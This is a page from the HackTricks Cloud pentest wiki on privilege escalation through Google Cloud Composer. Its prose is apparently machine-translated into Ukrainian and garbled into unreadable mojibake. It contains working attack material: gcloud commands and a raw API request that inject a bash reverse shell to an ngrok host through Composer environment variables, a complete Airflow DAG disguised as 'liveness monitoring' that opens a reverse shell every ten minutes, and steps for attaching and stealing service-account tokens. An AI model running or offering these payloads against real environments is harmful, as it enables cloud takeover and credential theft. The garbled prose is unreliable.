# GCP - Composer Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## composer

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤:

{% content-ref url="../gcp-services/gcp-composer-enum.md" %}
[gcp-composer-enum.md](../gcp-services/gcp-composer-enum.md)
{% endcontent-ref %}

### `composer.environments.create`

–ú–æ–∂–ª–∏–≤–æ **–ø—Ä–∏–∫—Ä—ñ–ø–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏** –¥–æ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –∫–æ–º–ø–æ–∑–µ—Ä–∞ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º. –ü—ñ–∑–Ω—ñ—à–µ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–º–ø–æ–∑–µ—Ä–∞, —â–æ–± –≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏.
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é [**—Ç—É—Ç**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/i-composer.environmets.create.sh).

### `composer.environments.update`

–ú–æ–∂–ª–∏–≤–æ –æ–Ω–æ–≤–∏—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –∫–æ–º–ø–æ–∑–µ—Ä–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–º—ñ–Ω—é—é—á–∏ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞:

{% code overflow="wrap" %}
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
{% endcode %}

TODO: –û—Ç—Ä–∏–º–∞—Ç–∏ RCE, –¥–æ–¥–∞–≤—à–∏ –Ω–æ–≤—ñ –ø–∞–∫—É–Ω–∫–∏ pypi –¥–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

### –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ Dags

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ dags, —â–æ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è:

{% code overflow="wrap" %}
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
{% endcode %}

### –Ü–º–ø–æ—Ä—Ç Dags

–î–æ–¥–∞–π—Ç–µ –∫–æ–¥ python DAG —É —Ñ–∞–π–ª —ñ —ñ–º–ø–æ—Ä—Ç—É–π—Ç–µ –π–æ–≥–æ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏:

{% code overflow="wrap" %}
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/dags/reverse_shell.py
```
{% endcode %}

DAG –∑ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª–æ–º:

{% code title="reverse_shell.py" %}
```python
import airflow
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import timedelta

default_args = {
'start_date': airflow.utils.dates.days_ago(0),
'retries': 1,
'retry_delay': timedelta(minutes=5)
}

dag = DAG(
'reverse_shell',
default_args=default_args,
description='liveness monitoring dag',
schedule_interval='*/10 * * * *',
max_active_runs=1,
catchup=False,
dagrun_timeout=timedelta(minutes=10),
)

# priority_weight has type int in Airflow DB, uses the maximum.
t1 = BashOperator(
task_id='bash_rev',
bash_command='bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14382 0>&1',
dag=dag,
depends_on_past=False,
priority_weight=2**31 - 1,
do_xcom_push=False)
```
{% endcode %}

### –î–æ—Å—Ç—É–ø –Ω–∞ –∑–∞–ø–∏—Å –¥–æ –∫–æ—à–∏–∫–∞ Composer

–£—Å—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ composer (DAG, –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ –¥–∞–Ω—ñ) –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –∫–æ—à–∏–∫—É GCP. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è —Ç–∞ –∑–∞–ø–∏—Å, –≤—ñ–Ω –º–æ–∂–µ –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ –∫–æ—à–∏–∫ —ñ **–∫–æ–ª–∏ DAG —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∞–±–æ –æ–Ω–æ–≤–ª—é—î—Ç—å—Å—è, –ø–æ–¥–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é –∑ –±–µ–∫–¥–æ—Ä–æ–º**, —â–æ–± —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ composer –æ—Ç—Ä–∏–º–∞–ª–æ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –≤–µ—Ä—Å—ñ—é –∑ –±–µ–∫–¥–æ—Ä–æ–º.

–û—Ç—Ä–∏–º–∞–π—Ç–µ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –∞—Ç–∞–∫—É –≤:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

### –Ü–º–ø–æ—Ä—Ç –ø–ª–∞–≥—ñ–Ω—ñ–≤

TODO: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —â–æ –º–æ–∂–Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –ø–ª–∞–≥—ñ–Ω–∏

### –Ü–º–ø–æ—Ä—Ç –¥–∞–Ω–∏—Ö

TODO: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —â–æ –º–æ–∂–Ω–∞ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –¥–∞–Ω—ñ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
